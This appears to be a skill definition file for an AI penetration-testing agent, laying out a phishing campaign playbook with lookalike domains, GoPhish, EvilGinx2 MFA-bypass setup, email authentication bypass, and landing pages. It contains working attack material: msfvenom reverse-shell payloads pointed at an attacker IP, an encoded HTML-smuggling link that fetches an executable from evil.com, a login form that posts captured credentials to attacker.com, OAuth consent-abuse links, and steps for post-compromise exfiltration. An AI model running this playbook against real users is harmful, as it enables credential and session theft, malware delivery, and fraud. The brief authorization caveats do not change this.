---
name: phishing
description: "Phishing campaign methodology: GoPhish, EvilGinx2, payload delivery, email auth bypass, credential harvesting, and MFA bypass"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["phishing", "gophish", "evilginx", "credential harvesting", "email phishing", "spear phishing", "mfa bypass", "oauth phishing", "token theft", "phishing campaign", "email authentication bypass"]
mitreAttack: ["T1566", "T1598"]
owaspRefs: ["OWASP Top 10 A07:2021 Identification and Authentication Failures"]
---

# Phishing Campaigns

## When to Use

- You are conducting an authorized phishing campaign as part of a red team engagement
- You need to test employee security awareness and email filtering effectiveness
- You are assessing credential exposure through phishing
- Testing MFA resilience against adversary-in-the-middle attacks

## Do Not Use

- To phish real users without explicit written authorization
- To harvest credentials for unauthorized access
- To deliver malware beyond the agreed engagement scope

## Auth Context

Phishing infrastructure is deployed as part of authorized engagements. All interactions should use proper authorization documentation.

---

## Phase 1: Infrastructure

### Domain Setup

```bash
# Register lookalike domain
# Use privacy protection, different registrar than target
# Age the domain (30+ days preferred)
# Set up SPF, DKIM, DMARC (for deliverability)

# Configure DNS
A       mail.evil.com    ATTACKER_IP
MX      mail.evil.com    mail.evil.com
TXT     "v=spf1 a mx ~all"
TXT     "_dmarc" "v=DMARC1; p=none; rua=mailto:dmarc@evil.com"
```

### Email Server

```bash
# Configure SMTP relay
# Use reputable provider to avoid blacklists
# Set up DKIM signing
# Configure bounce handling
```

---

## Phase 2: Payload Delivery

### GoPhish Campaign

```bash
# Install GoPhish
wget https://github.com/gophish/gophish/releases/latest
unzip gophish_*.zip
chmod +x gophish
./gophish

# Configure campaign
# 1. Create Sending Profile (SMTP server)
# 2. Create Email Template (phishing email)
# 3. Create Landing Page (credential capture)
# 4. Create User Group (targets)
# 5. Create Campaign (launch)
```

### Office Macro Payload

```bash
# Generate macro
msfvenom -p windows/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f vba

# Embed in Office document
# Tools: evilginx2, GoPhish, King Phisher
```

### HTML Smuggling

```html
<!-- Embed payload in HTML email -->
<a href="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0iaHR0cDovL2V2aWwuY29tL3BheWxvYWQuZXhlIjwvc2NyaXB0Pg==">View Document</a>
```

### LNK Shortcut

```bash
# Create malicious shortcut
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh-cmd > payload.txt
```

---

## Phase 3: MFA Bypass (Adversary-in-the-Middle)

### EvilGinx2

```bash
# Install
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && go build

# Configure
evilginx2
evilginx2> config domain evil.com
evilginx2> config ipv4 ATTACKER_IP

# Create phishlet
evilginx2> phishlets hostname o365 login.evil.com
evilginx2> phishlets enable o365

# Create lure
evilginx2> lure create o365
evilginx2> lure get-url 1
```

### How AitM Works

```
User → evilginx2 (reverse proxy) → legitimate site
         ↓                              ↓
    Captures session token        Authenticates user
         ↓
  Attacker gets valid session cookie
  (bypasses MFA because user completed MFA on real site)
```

---

## Phase 4: Email Authentication Bypass

### SPF Softfail Exploitation

```bash
# If target has: v=spf1 include:_spf.google.com ~all
# Softfail (~all) means spoofed emails are accepted but marked
# Hardfail (-all) would reject them
```

### DKIM Replay

```bash
# Capture signed DKIM email, replay it from different sender
# Requires: original DKIM signature + email body unchanged
# Bypass: change From header (DKIM signs body + selected headers)
```

### Display Name Spoofing

```
From: "IT Security Team" <legitimate@target.com>
# Display name looks legitimate, but actual address is attacker-controlled
```

### Homoglyph/Cousin Domain

```bash
# Register visually similar domain
# target.com → target.com (Cyrillic 'а')
# target.com → target-rn.com (extra character)
# target.com → targ3t.com (number substitution)
```

---

## Phase 5: Landing Pages

### Credential Harvesting

```html
<!-- Clone legitimate login page -->
<!-- Modify form action to capture credentials -->
<form action="https://attacker.com/capture" method="POST">
  <input type="email" name="username" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Sign In</button>
</form>
```

### OAuth Consent Abuse

```html
<!-- Request excessive OAuth permissions -->
<!-- User grants access thinking it's legitimate app -->
<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=ATTACKER_APP_ID&
  response_type=code&
  scope=Mail.Read+Files.ReadWrite.All+offline_access&
  redirect_uri=https://attacker.com/callback">
  Sign in with Microsoft
</a>
```

---

## Phase 6: Post-Compromise

```bash
# Use captured credentials
# 1. Access email → find sensitive data
# 2. Access files → exfiltrate data
# 3. Set up forwarding rules → persistent access
# 4. Send internal phishing → lateral movement
# 5. Access cloud resources → privilege escalation
```

---

## Cheat Sheet — Quick Reference

| Technique | Tool | Bypass |
|-----------|------|--------|
| Credential harvest | GoPhish, SET | Basic phishing |
| MFA bypass | EvilGinx2, Modlishka | Session token relay |
| OAuth abuse | Manual | Excessive permissions |
| HTML smuggling | Custom HTML | Attachment filters |
| LNK shortcut | msfvenom | Macro detection |
| SPF softfail | DNS analysis | Email authentication |
| DKIM replay | Captured email | DKIM validation |

---

## Anti-Hallucination

- Phishing campaigns require explicit written authorization — never execute without it
- EvilGinx2 captures session tokens, not passwords — document what was actually captured
- MFA bypass via AitM requires the user to complete MFA on the phishing page — it does not bypass MFA itself
- Document the exact email infrastructure, domain, and detection signals for each finding
- Email filtering effectiveness varies — test multiple delivery methods
